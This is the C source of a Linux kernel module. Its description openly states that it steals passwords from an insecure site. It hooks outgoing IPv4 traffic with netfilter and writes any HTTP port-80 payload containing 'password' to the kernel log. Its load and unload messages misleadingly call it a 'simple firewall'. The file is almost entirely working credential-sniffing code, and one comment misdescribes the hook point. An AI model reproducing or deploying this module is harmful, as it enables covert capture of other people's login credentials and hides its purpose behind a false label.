#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/tcp.h>
#include <linux/inet.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("Erik Beitel");
MODULE_DESCRIPTION("A Linux module to steal a password from an insecure site");
MODULE_VERSION("0.01");


static struct nf_hook_ops nfho; 

//function to be called by hook
unsigned int hook_func_outgoing(void *priv, 
                                struct sk_buff *skb, 
                                const struct nf_hook_state *state)
{

  struct iphdr    * iph;
  struct tcphdr   * tcph;
  unsigned char   * http_port = "\x00\x50";
  char            * data;	   

  iph = ip_hdr(skb);

  //is it ip/tcp
  if(iph && iph->protocol && (iph->protocol == IPPROTO_TCP)) {
	tcph = (struct tcphdr *)((__u32 *)iph + iph->ihl);

	//is it port 80
	if (tcph && (tcph->dest) == *(unsigned short *)http_port) {
		if(tcph->doff) {
			//get the http data and header by looking at the tcp data offset
			data = (char *)((unsigned char *)tcph + (tcph->doff * 4));
			if(strstr(data, "password")) {
				printk(KERN_DEBUG "found a password\n");
				printk(KERN_DEBUG "%s\n", data);
			}
		} else {
		
			printk(KERN_DEBUG "tcph doff failed");
		}
	}
  }
    return NF_ACCEPT;
}

//Called when module loaded using 'insmod'
int init_module()
{
  //function to call when conditions below met
  nfho.hook = hook_func_outgoing; 

  //called right after packet received, first hook in Netfilter
  nfho.hooknum = NF_INET_POST_ROUTING; 
  
  //IPV4 packets
  nfho.pf = PF_INET;                          
  
  //set to highest priority over all other hook functions
  nfho.priority = NF_IP_PRI_FIRST;  
  
  //register hook
  nf_register_net_hook(&init_net, &nfho);                    
  
  printk(KERN_INFO "simple firewall loaded\n");
  return 0;
}

//Called when module unloaded using 'rmmod'
void cleanup_module()
{ 
  printk("simple firewall unloaded\n");
  nf_unregister_net_hook(&init_net, &nfho);                //cleanup and unregister hook
}

//module_init(mod_init);
//module_exit(mod_exit);
